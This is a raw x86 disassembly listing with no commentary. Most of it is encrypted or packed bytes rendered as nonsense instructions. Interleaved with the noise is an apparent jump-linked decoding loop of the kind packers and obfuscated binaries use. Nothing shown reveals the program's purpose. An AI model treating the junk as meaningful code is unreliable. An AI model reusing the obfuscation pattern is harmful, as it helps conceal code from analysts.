  405a59:	inc    ebx
  405a5a:	pop    ds
  405a5b:	cs inc esp
  405a5d:	aas    
  405a5e:	or     eax,DWORD PTR [ebp-0x35]
  405a61:	inc    edx
  405a62:	push   es
  405a63:	sar    BYTE PTR [eax-0x49],cl
  405a66:	sub    bl,BYTE PTR [edi+ebp*2-0x59]
  405a6a:	pushf  
  405a6b:	test   DWORD PTR [esi+0x3],esi
  405a6e:	xor    BYTE PTR [eax+edi*4],0x58
  405a72:	fwait
  405a73:	out    dx,al
  405a74:	fsubr  DWORD PTR [ebp-0x162cad21]
  405a7a:	ret    
  405a7b:	lahf   
  405a7c:	pop    edi
  405a7d:	mov    eax,0x6c985aeb
  405a82:	cmp    DWORD PTR [ebx-0x5],eax
  405a85:	dec    eax
  405a86:	sti    
  405a87:	mov    ?,WORD PTR [ecx+esi*8-0x46]
  405a8b:	and    eax,0xb1473c51
  405a90:	or     eax,0x56a08641
  405a95:	and    DWORD PTR [ebx],esi
  405a97:	ud1    esp,DWORD PTR [edx+0x33]
  405a9b:	push   eax
  405a9c:	add    edi,ebx
  405a9e:	outs   dx,BYTE PTR ds:[esi]
  405a9f:	mov    ch,0x1f
  405aa1:	scas   al,BYTE PTR es:[edi]
  405aa2:	sbb    al,0xb6
  405aa4:	rol    ebx,1
  405aa6:	aad    0x3f
  405aa8:	cmp    eax,0x64145243
  405aad:	scas   al,BYTE PTR es:[edi]
  405aae:	xchg   edi,eax
  405aaf:	push   edx
  405ab0:	out    dx,eax
  405ab1:	dec    esi
  405ab2:	pop    esp
  405ab3:	mov    al,0x98
  405ab5:	jns    0x405a6f
  405ab7:	arpl   sp,dx
  405ab9:	xchg   edx,eax
  405aba:	dec    ebp
  405abb:	scas   eax,DWORD PTR es:[edi]
  405abc:	sub    edi,ecx
  405abe:	mov    ds:0x79e76df3,eax
  405ac3:	pusha  
  405ac4:	push   ds
  405ac5:	mov    dh,0x66
  405ac7:	push   ebx
  405ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ac9:	dec    BYTE PTR [ebp+0x6f9e6ae3]
  405acf:	imul   ecx,DWORD PTR [esi+0x128041f6],0x77004da3
  405ad9:	push   ebx
  405ada:	pop    ebx
  405adb:	cmp    bh,ah
  405add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ade:	fisub  WORD PTR [ecx]
  405ae0:	dec    ecx
  405ae1:	jge    0x405af1
  405ae3:	retf   0xe78d
  405ae6:	lods   eax,DWORD PTR ds:[esi]
  405ae7:	sbb    edx,DWORD PTR [edx-0x732777c1]
  405aed:	adc    BYTE PTR [edi+0x1b531cb2],0xfe
  405af4:	stos   BYTE PTR es:[edi],al
  405af5:	mov    al,ds:0xf00e64d1
  405afa:	int    0x78
  405afc:	out    dx,eax
  405afd:	add    al,0x91
  405aff:	iret   
  405b00:	sub    BYTE PTR [eax],ah
  405b02:	jb     0x405acc
  405b04:	xor    ebp,esp
  405b06:	or     BYTE PTR ds:0x321328aa,al
  405b0c:	cmc    
  405b0d:	mov    dl,0xf
  405b0f:	popa   
  405b10:	adc    eax,DWORD PTR [esi-0xc1c7e16]
  405b16:	jge    0x405b55
  405b18:	mov    edx,0xa4af2e02
  405b1d:	push   edx
  405b1e:	jmp    0x405ab7
  405b20:	and    al,0xd2
  405b22:	pop    ebx
  405b23:	add    al,0x58
  405b25:	pop    ds
  405b26:	cmp    ecx,0xa3b798df
  405b2c:	jmp    0x405b15
  405b2e:	stos   BYTE PTR es:[edi],al
  405b2f:	xor    BYTE PTR [esi+0x72],bl
  405b32:	dec    BYTE PTR [esi+0x7767dedb]
  405b38:	sbb    al,0xb2
  405b3a:	outs   dx,BYTE PTR ds:[esi]
  405b3b:	and    eax,0xdf4d4fa8
  405b40:	and    ecx,DWORD PTR [ebx+ebp*4+0x3f153322]
  405b47:	retf   
  405b48:	mov    eax,0xf42bbad0
  405b4d:	jmp    0x405b7d
  405b4f:	call   0x1e11ece6
  405b54:	shl    BYTE PTR [ebp+0x6b],1
  405b57:	psllq  mm6,mm4
  405b5a:	cmp    DWORD PTR [edx+0x2d5b51f6],ebp
  405b60:	adc    DWORD PTR [eax],esp
  405b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b63:	retf   0x146f
  405b66:	hlt    
  405b67:	add    eax,0x2a43d542
  405b6c:	nop
  405b6d:	and    eax,0x970afa79
  405b72:	ror    BYTE PTR [ebp-0x71],1
  405b75:	inc    ebp
  405b76:	dec    edx
  405b77:	adc    al,0x53
  405b79:	pop    ebp
  405b7a:	cmp    al,0xf0
  405b7c:	or     cl,BYTE PTR [edx]
  405b7e:	xchg   esp,eax
  405b7f:	sbb    eax,0x13fa6298
  405b85:	xor    eax,0xdf7357ab
  405b8a:	add    BYTE PTR [edx+0x5b2c477e],0x7c
  405b91:	inc    ebx
  405b92:	pop    ss
  405b93:	adc    BYTE PTR [esi-0x7d],bh
  405b96:	enter  0x15e6,0xbd
  405b9a:	out    dx,eax
  405b9b:	or     DWORD PTR [edi-0x6e1cc3d4],edx
  405ba1:	xchg   edi,eax
  405ba2:	dec    ebx
  405ba3:	pop    ebx
  405ba4:	repz mov bh,0x48
  405ba7:	sbb    al,0x59
  405ba9:	test   BYTE PTR [eax],bh
  405bab:	pop    ss
  405bac:	push   ss
  405bad:	mov    ecx,0xe1b10bae
  405bb2:	iret   
  405bb3:	pop    es
  405bb4:	pop    es
  405bb5:	and    al,0x7d
  405bb7:	int    0x4b
  405bb9:	ficom  WORD PTR [ebx+0x3df53e75]
  405bbf:	test   ebp,ecx
  405bc1:	mov    edx,0xb21cfef8
  405bc6:	dec    ebp
  405bc7:	jno    0x405b77
  405bc9:	mov    al,BYTE PTR [ebx-0x10ae4653]
  405bcf:	mov    cl,0xd4
  405bd1:	pop    ss
  405bd2:	test   al,0xf6
  405bd4:	pusha  
  405bd5:	out    0xaf,al
  405bd7:	mov    esi,0xd3be15d2
  405bdc:	stos   DWORD PTR es:[edi],eax
  405bdd:	fisub  WORD PTR [ecx]
  405bdf:	and    dl,BYTE PTR [esi+0x2e5b31b1]
  405be5:	sub    eax,0x8f859368
  405bea:	aad    0x77
  405bec:	sbb    BYTE PTR [eax],ah
  405bee:	retf   
  405bef:	mov    edx,0x771b8f7b
  405bf4:	lea    edx,ds:0xfd27347e
  405bfa:	pop    edx
  405bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bfc:	xchg   ebx,eax
  405bfd:	scas   eax,DWORD PTR es:[edi]
  405bfe:	fsub   QWORD PTR [ebp-0x14e77f9e]
  405c04:	xor    eax,0x856bf46c
  405c09:	xchg   ebx,eax
  405c0a:	xchg   DWORD PTR [eax-0x5f],ebp
  405c0d:	mov    dl,0x97
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xf05d0ed0,dx
  405c45:	(bad)  [ecx-0x2]
  405c48:	push   eax
  405c49:	cmp    edi,DWORD PTR [esi+0x7e]
  405c4c:	mov    ebp,0x277e7e71
  405c51:	inc    ebp
  405c52:	mov    ?,WORD PTR [edi-0x77]
  405c55:	adc    al,0xaa
  405c57:	aad    0x77
  405c59:	mov    DWORD PTR ds:0x743c2385,edx
  405c5f:	iret   
  405c60:	(bad)  
  405c61:	mov    ebp,?
  405c63:	xchg   esi,eax
  405c64:	sub    al,0x6
  405c66:	lahf   
  405c67:	add    edx,ecx
  405c69:	jecxz  0x405c00
  405c6b:	std    
  405c6c:	test   DWORD PTR [edx-0x25],esp
  405c6f:	(bad)  
  405c70:	cli    
  405c71:	in     al,dx
  405c72:	in     eax,0x1a
  405c74:	js     0x405c05
  405c76:	mov    DWORD PTR [ebp+0x3ee067a1],edx
  405c7c:	adc    esp,ebp
  405c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c7f:	and    cl,ah
  405c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c82:	mov    gs,WORD PTR [esi]
  405c84:	lods   eax,DWORD PTR ds:[esi]
  405c85:	shl    DWORD PTR [edi],cl
  405c87:	mov    BYTE PTR [ebx+eiz*1-0x26],bh
  405c8b:	jle    0x405c53
  405c8d:	push   esi
  405c8e:	call   0x44462c71
  405c93:	sub    DWORD PTR [ebx+eiz*1],0x97a554a4
  405c9a:	and    DWORD PTR [eax-0x58],edx
  405c9d:	push   ebx
  405c9e:	sub    al,bl
  405ca0:	xor    DWORD PTR es:[esi+0x4e056460],edi
  405ca7:	push   edi
  405ca8:	retf   0x47d3
  405cab:	add    al,dh
  405cad:	xchg   ebp,eax
  405cae:	mov    bl,0x47
  405cb0:	pop    ss
  405cb1:	sub    edx,DWORD PTR [esi]
  405cb3:	xchg   ecx,eax
  405cb4:	pop    ss
  405cb5:	hlt    
  405cb6:	jmp    0xe23ff00d
  405cbb:	or     ecx,ebx
  405cbd:	out    dx,al
  405cbe:	(bad)  
  405cbf:	xchg   edx,eax
  405cc1:	rcl    BYTE PTR ds:0x77dac0fc,cl
  405cc7:	push   0x93c9a94a
  405ccc:	xchg   esi,ebp
  405cce:	pop    ebx
  405ccf:	shl    edx,cl
  405cd1:	je     0x405ce6
  405cd3:	int    0x54
  405cd5:	xlat   BYTE PTR ds:[ebx]
  405cd6:	mov    ch,0x7e
  405cd8:	xchg   edi,eax
  405cd9:	ror    DWORD PTR [ecx-0x394b29a7],1
  405cdf:	add    BYTE PTR [ebx],ch
  405ce1:	push   esi
  405ce2:	fst    QWORD PTR [ecx+0x54]
  405ce5:	dec    esp
  405ce6:	dec    edx
  405ce7:	adc    eax,0x8b401940
  405cec:	inc    ebx
  405ced:	hlt    
  405cee:	xor    dl,cl
  405cf0:	fistp  DWORD PTR [esi]
  405cf2:	iret   
  405cf3:	call   0x810a:0xc90c46f1
  405cfa:	out    dx,al
  405cfb:	jns    0x405d4b
  405cfd:	jne    0x405c91
  405cff:	inc    ebp
  405d00:	mov    DWORD PTR [edi+0x6b],edx
  405d03:	in     eax,dx
  405d04:	fdiv   QWORD PTR [edx]
  405d06:	xchg   ebp,eax
  405d07:	retf   0xe6d
  405d0a:	sti    
  405d0b:	stos   DWORD PTR es:[edi],eax
  405d0c:	xor    DWORD PTR [ecx+eiz*1+0x11],0xb1922b71
  405d14:	fs out dx,eax
  405d16:	mov    ecx,0x45f7a69d
  405d1b:	pop    eax
  405d1c:	into   
  405d1d:	jg     0x405cbd
  405d1f:	stc    
  405d20:	push   0xe
  405d22:	hlt    
  405d23:	bound  ebx,QWORD PTR [ebx+edi*1-0xb]
  405d27:	adc    BYTE PTR [edx],0xcd
  405d2a:	or     bh,ah
  405d2c:	ret    0xecfd
  405d2f:	push   ds
  405d30:	outs   dx,BYTE PTR ds:[esi]
  405d31:	adc    BYTE PTR [edx],dh
  405d33:	pushf  
  405d34:	dec    edx
  405d35:	dec    esp
  405d36:	outs   dx,DWORD PTR ds:[esi]
  405d37:	jne    0x405cd0
  405d39:	mov    bl,cl
  405d3b:	sub    edi,0x32
  405d3e:	shr    DWORD PTR [esi+0x61],cl
  405d41:	or     al,0xa7
  405d43:	xchg   ecx,eax
  405d44:	or     esi,ebx
  405d46:	dec    edi
  405d47:	pop    es
  405d48:	pusha  
  405d49:	mul    DWORD PTR [eax]
  405d4b:	mov    ds:0x400ca767,al
  405d50:	(bad)  
  405d51:	mov    al,ds:0x72a3f722
  405d56:	jmp    0x450600b0
  405d5b:	xor    BYTE PTR [ecx+0x3ecafcc1],bl
  405d61:	xor    al,0xc1
  405d63:	push   esi
  405d64:	push   cs
  405d65:	ss jne 0x405ddf
  405d68:	ss mov edi,0xbdcc1943
  405d6e:	inc    ebp
  405d6f:	jmp    0x1f89304
  405d74:	dec    ebx
  405d75:	xchg   ebp,eax
  405d76:	push   edx
  405d77:	adc    al,BYTE PTR [edi]
  405d79:	fisub  DWORD PTR [eax]
  405d7b:	ret    0xe3c3
  405d7e:	out    dx,eax
  405d7f:	push   ebx
  405d80:	pop    ebx
  405d81:	rcl    DWORD PTR [esi+ebx*1-0x3d],0x2
  405d86:	aad    0x0
  405d88:	out    0x51,eax
  405d8a:	sub    esi,DWORD PTR [ecx+0x53a91ac0]
  405d90:	ror    cl,1
  405d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d93:	xchg   esp,eax
  405d94:	push   es
  405d95:	imul   ebp,DWORD PTR [esp+ebx*1-0x271ae5f7],0xffffff95
  405d9d:	jmp    0x405db7
  405d9f:	fcom   QWORD PTR [ecx]
  405da1:	push   esi
  405da2:	inc    ecx
  405da3:	dec    ebp
  405da4:	or     DWORD PTR [esi-0x6c7d7ef0],esi
  405daa:	arpl   WORD PTR [eax-0x2c],bp
  405dad:	pop    ecx
  405dae:	(bad)  
  405daf:	aaa    
  405db0:	arpl   WORD PTR [ebp+0x56b94329],cx
  405db6:	pushf  
  405db7:	jp     0x405e03
  405db9:	stos   DWORD PTR es:[edi],eax
  405dba:	mov    al,ds:0x84358c8
  405dbf:	push   esp
  405dc0:	xor    BYTE PTR [ebp+0x28fd4ce1],bh
  405dc6:	inc    ecx
  405dc7:	dec    edx
  405dc8:	xor    esi,0x38
  405dcb:	mov    esp,DWORD PTR [eax-0x13]
  405dce:	fld    st(4)
  405dd0:	fbstp  TBYTE PTR [edx-0x44]
  405dd3:	dec    ebp
  405dd4:	hlt    
  405dd5:	test   eax,0x6b6bd5e4
  405dda:	dec    esi
  405ddb:	fiadd  WORD PTR [edx-0x29d78883]
  405de1:	or     BYTE PTR [edi],0xc5
  405de4:	sub    al,0x2e
  405de6:	or     edx,ecx
  405de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de9:	jecxz  0x405dfd
  405deb:	pop    DWORD PTR [eax]
  405ded:	dec    edx
  405dee:	jmp    0x405dfd
  405df0:	arpl   WORD PTR [ebp-0x34],ax
  405df3:	add    al,0x64
  405df5:	mov    ebx,0x762dc58d
  405dfa:	mul    esp
  405dfc:	scas   al,BYTE PTR es:[edi]
  405dfd:	ins    DWORD PTR es:[edi],dx
  405dfe:	repz add eax,0x9330ac3a
  405e04:	sti    
  405e05:	enter  0xd3e,0x74
  405e09:	addr16 inc esp
  405e0b:	dec    ebx
  405e0c:	adc    dl,cl
  405e0e:	cmp    eax,0x8b6b37a9
  405e13:	and    BYTE PTR [eax-0x7d8861d0],ah
  405e19:	pushf  
  405e1a:	inc    edi
  405e1b:	mov    edi,0x9ae69857
  405e20:	es jecxz 0x405dff
  405e23:	stos   DWORD PTR es:[edi],eax
  405e24:	sbb    al,0x50
  405e26:	dec    ecx
  405e27:	cli    
  405e28:	outs   dx,DWORD PTR ds:[esi]
  405e29:	es out dx,al
  405e2b:	pop    edx
  405e2c:	jle    0x405de3
  405e2e:	cs push edx
  405e30:	lahf   
  405e31:	imul   edx,edi,0x163f9377
  405e37:	call   FWORD PTR [ebp-0x3fc77c96]
  405e3d:	(bad)  [esi+0x76]
  405e40:	xor    esp,DWORD PTR [esi]
  405e42:	push   0xffffffd1
  405e44:	out    dx,al
  405e45:	jnp    0x405deb
  405e47:	push   es
  405e48:	add    edx,DWORD PTR [eax+0x6a91203a]
  405e4e:	ins    DWORD PTR es:[edi],dx
  405e4f:	aaa    
  405e50:	push   esp
  405e51:	in     eax,0x6b
  405e53:	arpl   bx,sp
  405e55:	sbb    esi,DWORD PTR [eax+0x38384adc]
  405e5b:	imul   ebx,DWORD PTR [ebx+0x8],0xffffff92
  405e5f:	jl     0x405e08
  405e61:	aas    
  405e62:	fwait
  405e63:	dec    esp
  405e64:	push   ebx
  405e65:	je     0x405ebf
  405e67:	add    BYTE PTR [esi],dl
  405e69:	push   cs
  405e6a:	or     DWORD PTR fs:[ebx],esi
  405e6d:	xchg   ebp,eax
  405e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e6f:	cmp    DWORD PTR [esp+edx*1-0x34f1ec1c],ecx
  405e76:	mov    dl,0x9d
  405e78:	cs jbe 0x405ebd
  405e7b:	sbb    al,0xcf
  405e7d:	add    BYTE PTR [ecx],dl
  405e7f:	dec    ecx
  405e80:	jbe    0x405ec8
  405e82:	and    cl,BYTE PTR ds:0x24cbaffa
  405e88:	and    dl,al
  405e8a:	mov    eax,0x9aef09f9
  405e8f:	jmp    0xc999:0x16d9abbc
  405e96:	test   BYTE PTR [esi-0x3a],0xfa
  405e9a:	xlat   BYTE PTR ss:[ebx]
  405e9c:	dec    ecx
  405e9d:	or     al,0x19
  405e9f:	lods   eax,DWORD PTR ds:[esi]
  405ea0:	test   eax,0xf22fb86b
  405ea5:	and    ah,dh
  405ea7:	jno    0x405e76
  405ea9:	or     DWORD PTR [edx+0x4bbad44d],ecx
  405eaf:	sbb    esp,DWORD PTR [esi-0x4d7269bc]
  405eb5:	and    DWORD PTR [edi-0x10],0x710c5a2c
  405ebc:	add    BYTE PTR [ebp-0xa4243e3],bh
  405ec2:	scas   al,BYTE PTR es:[edi]
  405ec3:	cwde   
  405ec4:	pop    ss
  405ec5:	es sub eax,0x2ed2b736
  405ecb:	pop    ss
  405ecc:	repnz mov dh,0x88
  405ecf:	arpl   di,sp
  405ed1:	push   es
  405ed2:	mov    eax,ds:0xcf3b1e34
  405ed7:	xor    esp,edx
  405ed9:	inc    eax
  405eda:	fnsave [edx]
  405edc:	dec    eax
  405edd:	in     al,dx
  405ede:	fcmove st,st(1)
  405ee0:	push   edi
  405ee1:	sub    eax,0xc47269dd
  405ee6:	cmp    BYTE PTR [edi-0x7117008d],al
  405eec:	les    edi,FWORD PTR [edx-0x69401b9]
  405ef2:	add    bl,BYTE PTR [edi+ebp*1-0x2a]
  405ef6:	or     al,0x5a
  405ef8:	inc    esp
  405ef9:	std    
  405efa:	outs   dx,DWORD PTR ds:[esi]
  405efb:	sbb    DWORD PTR [ebx],edi
  405efd:	repnz and ecx,esp
  405f00:	xchg   esi,eax
  405f01:	ins    BYTE PTR es:[edi],dx
  405f02:	sbb    al,BYTE PTR [edi+0x89f6dbe]
  405f08:	mov    esi,0xbc3f739a
  405f0d:	xchg   edx,eax
  405f0e:	adc    al,0xc7
  405f10:	enter  0xee4b,0x8e
  405f14:	popf   
  405f15:	cwde   
  405f16:	hlt    
  405f17:	mov    dl,0xab
  405f19:	stos   BYTE PTR es:[edi],al
  405f1a:	mov    esi,edi
  405f1c:	aas    
  405f1d:	mov    eax,ds:0x968e8854
  405f22:	iret   
  405f23:	sbb    al,0x36
  405f25:	hlt    
  405f26:	fnstcw WORD PTR [eax+edx*1]
  405f29:	leave  
  405f2a:	inc    edi
  405f2b:	pop    ss
  405f2c:	xchg   esi,eax
  405f2d:	pop    ebp
  405f2e:	sbb    al,0x12
  405f30:	(bad)  
  405f32:	shl    BYTE PTR [edx+0x26],cl
  405f35:	mov    dl,0x7b
  405f37:	mov    edi,0xce569072
  405f3c:	xor    ebp,DWORD PTR [esi-0x24]
  405f3f:	mul    DWORD PTR [ebx]
  405f41:	jmp    0x12cd4562
  405f46:	push   esi
  405f47:	xlat   BYTE PTR ds:[ebx]
  405f48:	faddp  st(5),st
  405f4a:	jmp    0x16c2:0x886ac19a
  405f51:	sub    al,0x77
  405f53:	mov    edi,0xd2fad5c9
  405f58:	ret    0x16bc
  405f5b:	fucompp 
  405f5d:	mov    cs,WORD PTR ds:0x7e567e16
  405f63:	or     al,0xe
  405f65:	(bad)  
  405f66:	imul   ecx,DWORD PTR [ebp+0x7a3fa0e6],0xffffffc2
  405f6d:	adc    al,0x9
  405f6f:	retf   
  405f70:	pop    esi
  405f71:	es jo  0x405f03
  405f74:	sbb    al,BYTE PTR [eax+0x1af1f1bc]
  405f7a:	sub    bl,al
  405f7c:	ret    
  405f7d:	mov    al,0x91
  405f7f:	(bad)  [edi+0x3207a8f5]
  405f85:	push   edi
  405f86:	mov    ah,0x6f
  405f88:	call   FWORD PTR [ebp+0x7b108cfd]
  405f8e:	jecxz  0x405f57
  405f90:	addr16 fwait
  405f92:	inc    ecx
  405f93:	push   es
  405f94:	jns    0x405fe7
  405f96:	out    dx,eax
  405f97:	test   BYTE PTR [ebx+ecx*8],dh
  405f9a:	xchg   ecx,eax
  405f9b:	or     eax,DWORD PTR [ebp+0x7f]
  405f9e:	ror    al,cl
  405fa0:	scas   al,BYTE PTR es:[edi]
  405fa1:	mov    ah,0x14
  405fa3:	push   cs
  405fa4:	call   0xd754:0xf1a7e940
  405fab:	gs into 
  405fad:	adc    al,0xec
  405faf:	iret   
  405fb0:	dec    edx
  405fb1:	(bad)  
  405fb2:	mov    ecx,0xe3470783
  405fb7:	lods   al,BYTE PTR ds:[esi]
  405fb8:	hlt    
  405fb9:	mov    DWORD PTR [edx-0x52ee8170],ebp
  405fbf:	ret    0x3091
  405fc2:	dec    ebp
  405fc3:	test   DWORD PTR [ebx+esi*2],edx
  405fc6:	les    esp,FWORD PTR [ebx]
  405fc8:	cmp    eax,0x24c3e47e
  405fcd:	dec    esi
  405fce:	ss cmp eax,0x6d0fa4ba
  405fd4:	jecxz  0x405fde
  405fd6:	or     DWORD PTR [edx-0x10],0x146d6072
  405fdd:	ds mov ecx,0x2da02740
  405fe3:	test   BYTE PTR [edx-0x19543344],bl
  405fe9:	addr16 mov cl,0x80
  405fec:	jne    0x40604d
  405fee:	in     al,dx
  405fef:	dec    esi
  405ff0:	jbe    0x406061
  405ff2:	dec    esp
  405ff3:	lods   al,BYTE PTR ds:[esi]
  405ff4:	pop    eax
  405ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ff6:	jne    0x40603f
  405ff8:	and    cl,al
  405ffa:	pop    ebx
  405ffb:	in     al,dx
  405ffc:	ss push ss
  405ffe:	inc    esi
  405fff:	sbb    BYTE PTR [ecx],dh
  406001:	imul   ebx,DWORD PTR ds:0x42adf90,0xffffffd3
  406008:	scas   eax,DWORD PTR es:[edi]
  406009:	and    dh,cl
  40600b:	cli    
  40600c:	shl    bl,cl
  40600e:	inc    ebp
  40600f:	add    edi,esi
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	sbb    edx,DWORD PTR [eax+edx*4-0x5]
  40605a:	lahf   
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xf07e7e71
  406063:	arpl   ax,ax
  406065:	xchg   esi,ebx
  406067:	jp     0x40604c
  406069:	dec    ebp
  40606a:	dec    edi
  40606b:	out    0xaf,eax
  40606d:	mov    eax,DWORD PTR [esi]
  40606f:	mov    bh,0x9f
  406071:	add    eax,0x3854ed3d
  406076:	ror    DWORD PTR [edx+0x25],0x6
  40607a:	or     al,0x7c
  40607c:	or     cl,BYTE PTR [ecx+ebx*4+0x6cca2d05]
  406083:	sbb    DWORD PTR [eax-0x29],esi
  406086:	mov    esi,0x95a60d0e
  40608b:	fadd   DWORD PTR [ebx-0x56]
  40608e:	nop
  40608f:	jbe    0x4060a0
  406091:	mov    bl,0xce
  406093:	and    al,0xe7
  406095:	mov    ch,0x24
  406097:	cld    
  406098:	push   edx
  406099:	pop    ebp
  40609a:	xor    al,0x89
  40609c:	mov    cs,WORD PTR ds:0xce6a6054
  4060a2:	fistp  DWORD PTR [ecx]
  4060a4:	and    BYTE PTR [edx],ch
  4060a6:	xor    BYTE PTR [ebx-0x3c0c4f42],ch
  4060ac:	iret   
  4060ad:	mov    ds,WORD PTR [edx]
  4060af:	ret    
  4060b0:	add    eax,0x93b331b7
  4060b5:	add    eax,0x20768ba2
  4060ba:	sbb    DWORD PTR [esp+edx*4],ecx
  4060bd:	cmp    al,0x46
  4060bf:	sub    al,0x1f
  4060c1:	jl     0x406113
  4060c3:	mov    al,0xea
  4060c5:	jp     0x4060f4
  4060c7:	scas   eax,DWORD PTR es:[edi]
  4060c8:	jg     0x40611a
  4060ca:	test   DWORD PTR [edx+edx*8],ebx
  4060cd:	jge    0x406142
  4060cf:	pop    eax
  4060d0:	rcl    DWORD PTR [ecx+0x767c1860],0xd4
  4060d7:	rcl    DWORD PTR [ebx-0x4806bc00],0x5a
  4060de:	pop    es
  4060df:	sub    ah,bl
  4060e1:	mov    edx,0x79e744cf
  4060e6:	sbb    eax,0x778aad91
  4060eb:	pop    ebx
  4060ec:	stos   BYTE PTR es:[edi],al
  4060ed:	sar    al,1
  4060ef:	or     eax,0x81ee5f31
  4060f4:	mov    esi,0x7a350436
  4060f9:	cmp    bh,bh
  4060fb:	mov    esi,0xad26e8b3
  406100:	sbb    cl,BYTE PTR [edx]
  406102:	mov    bl,0xff
  406104:	arpl   WORD PTR [esi],dx
  406106:	dec    edx
  406107:	cmp    dl,BYTE PTR [ebp-0x232602b3]
  40610d:	pop    edi
  40610e:	das    
  40610f:	sub    al,0x3c
  406111:	or     ah,BYTE PTR ds:0x98a85734
  406117:	ror    ch,0xaa
  40611a:	(bad)  
  40611b:	pop    ecx
  40611c:	push   esi
  40611d:	pop    edx
  40611e:	neg    BYTE PTR [edi-0x42]
  406121:	xchg   BYTE PTR [ebp+edi*8-0x511dcd23],cl
  406128:	shl    DWORD PTR ss:[ecx-0xf943577],1
  40612f:	or     al,0x0
  406131:	fst    QWORD PTR [ebp-0x78]
  406134:	and    edi,DWORD PTR [eax+0x57be3529]
  40613a:	js     0x406135
  40613c:	xor    DWORD PTR [edx-0x26],eax
  40613f:	loopne 0x4060de
  406141:	xchg   DWORD PTR [ecx+0x3e],ebx
  406144:	(bad)  
  406145:	mov    eax,0xd19f49c0
  40614a:	sar    BYTE PTR [ebx-0x5639ab36],0x5c
  406151:	pop    esi
  406152:	mov    esp,0xd7e128a6
  406157:	fcomp  QWORD PTR ds:0x7683bfdf
  40615d:	enter  0x7e64,0xc9
  406161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406162:	sti    
  406163:	cmp    DWORD PTR [edx+0xd],ecx
  406166:	bnd call 0x248999
  40616c:	je     0x406188
  40616e:	jl     0x406121
  406170:	or     edx,esp
  406172:	jmp    0xee61a147
  406177:	pusha  
  406178:	nop
  406179:	les    esp,FWORD PTR [edi+esi*8+0x36]
  40617d:	inc    edi
  40617e:	pop    ds
  40617f:	xor    al,0x29
  406181:	xlat   BYTE PTR ds:[ebx]
  406182:	jne    0x406196
  406184:	jmp    0x94423331
  406189:	inc    edx
  40618a:	mov    edx,0xbc2c0862
  40618f:	or     esi,esp
  406191:	dec    ebp
  406192:	pop    ebp
  406193:	cmp    al,0x2e
  406195:	mov    eax,0xf5518c27
  40619a:	pop    edi
  40619b:	loop   0x4061fb
  40619d:	sbb    eax,0x2b945e21
  4061a2:	arpl   WORD PTR ss:[edi+0x7b],bp
  4061a6:	mov    DWORD PTR [edx],0x1944a833
  4061ac:	stos   DWORD PTR es:[edi],eax
  4061ad:	mov    esp,DWORD PTR [ebx+esi*2-0x2f6ce9f5]
  4061b4:	jge    0x4061ec
  4061b6:	(bad)  
  4061b7:	cli    
  4061b8:	ins    BYTE PTR es:[edi],dx
  4061b9:	outs   dx,BYTE PTR ds:[esi]
  4061ba:	fst    st(2)
  4061bc:	jle    0x406203
  4061be:	pop    ss
  4061bf:	(bad)  
  4061c0:	ins    DWORD PTR es:[edi],dx
  4061c1:	sub    BYTE PTR [esi+0x31],cl
  4061c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061c5:	adc    BYTE PTR [ebp+0x1d7f4b7],ah
  4061cb:	arpl   WORD PTR [ecx+0x6cf7401f],si
  4061d1:	test   DWORD PTR [esi-0x9bc414d],esi
  4061d7:	sbb    al,0x5d
  4061d9:	imul   esp,DWORD PTR [ebx],0x1c379f06
  4061df:	inc    ebx
  4061e0:	xor    edi,esp
  4061e2:	mov    dl,BYTE PTR ds:0xf33b0cc1
  4061e8:	cmp    bh,BYTE PTR [ecx+0x3ffea898]
  4061ee:	sub    al,0x62
  4061f0:	leave  
  4061f1:	and    al,0x1d
  4061f3:	inc    edx
  4061f4:	ja     0x406244
  4061f6:	int    0xea
  4061f8:	push   ebx
  4061f9:	int3   
  4061fa:	in     al,dx
  4061fb:	sahf   
  4061fc:	je     0x40624b
  4061fe:	xor    ebp,ecx
  406200:	inc    esp
  406201:	add    BYTE PTR [eax-0x74c772e9],cl
  406207:	imul   eax,DWORD PTR [ebx+eax*1],0x68
  40620b:	jp     0x40621b
  40620d:	mov    bl,0x50
  40620f:	mov    dx,0x447e
  406213:	jo     0x40625f
  406215:	push   esp
  406216:	popf   
  406217:	adc    BYTE PTR [eax-0x3e],dh
